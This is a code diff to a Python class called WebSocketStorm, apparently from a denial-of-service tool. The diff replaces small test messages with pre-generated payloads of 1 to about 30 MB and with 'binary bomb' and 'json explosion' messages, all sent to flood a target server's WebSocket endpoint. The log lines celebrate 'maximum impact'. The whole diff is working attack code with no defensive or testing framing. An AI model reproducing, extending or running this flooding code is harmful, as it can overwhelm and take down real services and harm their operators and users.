@@ -16,7 +16,7 @@ from config import USER_AGENTS
 
 
 class WebSocketStorm:
-    """WebSocket flood attack with connection and message spam."""
+    """WebSocket flood attack with MASSIVE PAYLOAD connection and message spam."""
     
     def __init__(self, config: Dict[str, Any]):
         self.config = config
@@ -35,14 +35,55 @@ class WebSocketStorm:
         ws_scheme = 'wss' if self.port == 443 else 'ws'
         self.ws_url = f"{ws_scheme}://{self.target}:{self.port}/"
         
-        # Message types to send
+        # MASSIVE PAYLOAD message types for maximum data transmission
         self.message_types = [
-            'text',
-            'binary',
-            'json',
-            'ping',
-            'large_payload'
+            'massive_text',
+            'massive_binary', 
+            'massive_json',
+            'ping_flood',
+            'huge_payload',
+            'binary_bomb',
+            'json_explosion'
         ]
+        
+        # Generate massive payloads for WebSocket flooding
+        self.generate_massive_websocket_payloads()
+        
+    def generate_massive_websocket_payloads(self):
+        """Generate massive WebSocket payloads for maximum data transmission."""
+        logger.info("🚀 Generating MASSIVE WebSocket payloads for overwhelming data transmission...")
+        
+        # Massive payload sizes (MB range per message)
+        self.payload_sizes = [
+            1024 * 1024,      # 1 MB
+            5 * 1024 * 1024,  # 5 MB
+            10 * 1024 * 1024, # 10 MB  
+            50 * 1024 * 1024, # 50 MB
+        ]
+        
+        # Pre-generate massive payloads
+        self.massive_payloads = {}
+        
+        # Massive text payload
+        self.massive_payloads['text'] = 'DDOS_WEBSOCKET_FLOOD_' * (1024 * 100)  # ~2MB
+        
+        # Massive binary payload
+        self.massive_payloads['binary'] = bytes([i % 256 for i in range(1024 * 1024)])  # 1MB binary
+        
+        # Massive JSON payload
+        massive_json_data = {
+            'attack': 'websocket_flood',
+            'payload': 'X' * (1024 * 500),  # 500KB string
+            'data': ['flood_data_' + str(i) for i in range(10000)],  # 10k items
+            'massive_object': {f'key_{i}': 'value_' + 'X' * 100 for i in range(1000)}  # 1k key-value pairs
+        }
+        self.massive_payloads['json'] = json.dumps(massive_json_data)
+        
+        # Ultra massive payload for maximum impact
+        self.massive_payloads['ultra'] = b'ULTRA_MASSIVE_WEBSOCKET_PAYLOAD_' * (1024 * 1024)  # ~30MB
+        
+        logger.info(f"💥 Generated {len(self.massive_payloads)} massive WebSocket payload types")
+        logger.info(f"🎯 Largest payload: {len(self.massive_payloads['ultra']) // (1024*1024)} MB per message")
         
     async def run(self):
         """Execute the WebSocket storm attack."""
@@ -185,45 +226,48 @@ class WebSocketStorm:
                     except:
                         pass
 
-    async def _generate_message(self, message_type: str) -> str:
-        """Generate different types of WebSocket messages."""
-        if message_type == 'text':
-            # Simple text message
-            messages = [
-                "Hello WebSocket!",
-                "Test message",
-                "Connection active",
-                "Data transmission",
-                "WebSocket flood test"
-            ]
-            return random.choice(messages)
+    async def _generate_message(self, message_type: str):
+        """Generate MASSIVE WebSocket messages for maximum data transmission."""
+        if message_type == 'massive_text':
+            # Return massive text payload
+            return self.massive_payloads['text']
         
-        elif message_type == 'json':
-            # JSON message
-            data = {
-                'type': 'message',
-                'timestamp': int(time.time()),
-                'data': self._generate_random_string(random.randint(10, 100)),
-                'id': random.randint(1, 10000),
-                'action': random.choice(['update', 'create', 'delete', 'read'])
+        elif message_type == 'massive_binary':
+            # Return massive binary payload  
+            return self.massive_payloads['binary']
+        
+        elif message_type == 'massive_json':
+            # Return massive JSON payload
+            return self.massive_payloads['json']
+        
+        elif message_type == 'huge_payload':
+            # Return ultra massive payload
+            return self.massive_payloads['ultra']
+        
+        elif message_type == 'binary_bomb':
+            # Generate random massive binary bomb
+            size = random.choice(self.payload_sizes)
+            return bytes([random.randint(0, 255) for _ in range(min(size, 1024*1024))])  # Cap at 1MB for memory
+        
+        elif message_type == 'json_explosion':
+            # Generate massive JSON explosion
+            explosion_data = {
+                'attack_vector': 'websocket_massive_flood',
+                'payload_size': 'maximum',
+                'data_bomb': {f'massive_key_{i}': 'X' * 1000 for i in range(1000)},  # 1MB of keys
+                'array_flood': ['flood_item_' + 'Y' * 100 for _ in range(5000)],  # 500KB array
+                'timestamp': time.time(),
+                'ultra_payload': 'Z' * (1024 * 1024)  # 1MB string
             }
-            return json.dumps(data)
+            return json.dumps(explosion_data)
         
-        elif message_type == 'large_payload':
-            # Large payload to consume bandwidth
-            return "A" * random.randint(1000, 10000)
-        
-        elif message_type == 'binary':
-            # Binary data
-            return bytes([random.randint(0, 255) for _ in range(random.randint(10, 1000))])
-        
-        elif message_type == 'ping':
-            # Ping frame
-            return b"ping_data"
+        elif message_type == 'ping_flood':
+            # Massive ping payload
+            return b"PING_FLOOD_" + b"X" * (1024 * 100)  # 100KB ping
         
         else:
-            # Default text message
-            return self._generate_random_string(random.randint(10, 100))
+            # Default to massive text payload
+            return self.massive_payloads['text']
 
     def _generate_random_string(self, length: int) -> str:
         """Generate random string for messages."""
